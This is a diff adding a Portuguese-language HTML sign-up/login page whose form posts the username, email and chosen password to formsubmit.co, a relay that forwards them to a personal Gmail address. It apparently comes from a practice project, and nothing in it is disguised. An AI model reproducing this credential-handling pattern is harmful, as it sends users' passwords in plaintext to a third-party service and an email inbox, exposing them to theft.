@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="icon" href="./icon.png" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@500;800&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="./style.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login</title>
+  </head>
+
+  <body>
+    <div id="container-One">
+      <form
+        action="https://formsubmit.co/michaeledu2018@gmail.com"
+        method="POST"
+      >
+        <div class="container">
+          <label for="uname"><b>Usuário:</b></label>
+          <input
+            id="name"
+            type="text"
+            placeholder="Enter Username"
+            name="Nome"
+            required
+          />
+
+          <label for="psw"><b>Email</b></label>
+          <input
+            type="email"
+            placeholder="Email"
+            name="Email"
+            id="inputTwo"
+            required
+          />
+
+          <label for="psw"><b>Crie uma senha:</b></label>
+          <input
+            type="password"
+            placeholder="Enter Password"
+            name="Senha"
+            id="inputOne"
+            required
+          />
+
+          <button type="submit" id="botao">Enviar</button>
+          <label>
+            <input type="checkbox" checked="checked" name="remember" /> Remember
+            me
+          </label>
+        </div>
+
+        <div class="container" style="background-color: #f1f1f1">
+          <button type="reset" id="button-limp" class="cancelbtn">
+            Limpar
+          </button>
+          <span id="ver-senha" class="psw"><i class="bx bx-bullseye"></i></span>
+        </div>
+      </form>
+    </div>
+  </body>
+
+  <script src="./script.js"></script>
+</html>
